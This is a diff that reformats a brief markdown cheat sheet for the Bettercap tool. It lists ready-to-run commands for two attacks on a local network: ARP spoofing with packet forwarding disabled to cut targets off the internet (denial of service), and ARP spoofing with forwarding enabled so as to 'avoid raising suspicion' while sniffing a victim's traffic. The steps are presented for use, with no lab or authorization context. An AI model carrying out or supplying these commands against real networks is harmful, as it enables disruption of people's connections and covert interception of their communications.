@@ -1,37 +1,40 @@
-Prerequisite: "sudo apt install bettercap"
+**Prerequisite:** Must have Bettercap installed. Instructions [here](https://www.bettercap.org/project/installation/).
 
-Launch Bettercap: "sudo bettercap"
+**Launch Bettercap:** `sudo bettercap`
 
-Useful commands:
-- Show settings: "get <command to search>*"
-E.g: "get arp.spoof*"
+**Useful commands:**
+- Show customizable settings: `get <command to search>*`
 
-*Cut off one, many or all internet connections in a network (Denial Of Service):
+E.g: `get arp.spoof*`
 
-1. "net.probe on" - Start probing every IPs to detect those that are in use within the network.
 
-2. (optional) "net.show" - Show list of alive IPs. Can be extremely useful for detecting the intended target.
+## **Cut off one, many or all internet connections in a network (Denial Of Service):**
 
-3. "set arp.spoof.targets <IP or range>" - set target(s) to attack. Leave unset to attack hosts.
+1. `net.probe on` - Start probing every IPs to detect those that are in use within the network.
 
-4. "set arp.spoof.forwarding false" - disallow intercepted packets to continue, dropping the targets' connection.
+2. *(optional)* `net.show` - Show list of alive IPs. Can be extremely useful for detecting the intended target(s).
 
-5. "set arp.spoof.fullduplex true" - spoof both the targets and the gateway.
+3. `set arp.spoof.targets <IP or range>` - Set target(s) to attack. Leave unset to attack hosts.
 
-6. "arp.spoof on" - start DOSing.
+4. `set arp.spoof.forwarding false` - Disallow intercepted packets to continue, dropping the targets' connection.
 
-*Sniff on a device's network activity:
+5. `set arp.spoof.fullduplex true` - Spoof both the targets and the gateway.
 
-1. "net.probe on" - Start probing every IPs to detect those that are in use within the network.
+6. `arp.spoof on` - start DOSing.
 
-2. (optional) "net.show" - Show list of alive IPs. Can be extremely useful for detecting the intended target.
 
-3. "set arp.spoof.targets <IP or range>" - set target(s) to attack. Leave unset to attack hosts.
+## **Sniff on a device's network activity:**
 
-4. "set arp.spoof.forwarding true" - allow intercepted packets to continue, avoid raising suspicion.
+1. `net.probe on` - Start probing every IPs to detect those that are in use within the network.
 
-5. "set arp.spoof.fullduplex true" - spoof both the targets and the gateway.
+2. *(optional)* `net.show` - Show list of alive IPs. Can be extremely useful for detecting the intended target(s).
 
-6. "arp.spoof on" - start ARP Spoofing.
+3. `set arp.spoof.targets <IP or range>` - Set target(s) to attack. Leave unset to attack hosts.
 
-7. "net.sniff on" - start sniffing on packets.
+4. `set arp.spoof.forwarding true` - Allow intercepted packets to continue, avoid raising suspicion.
+
+5. `set arp.spoof.fullduplex true` - Spoof both the targets and the gateway.
+
+6. `arp.spoof on` - Start ARP Spoofing.
+
+7. `net.sniff on` - Start sniffing on packets.
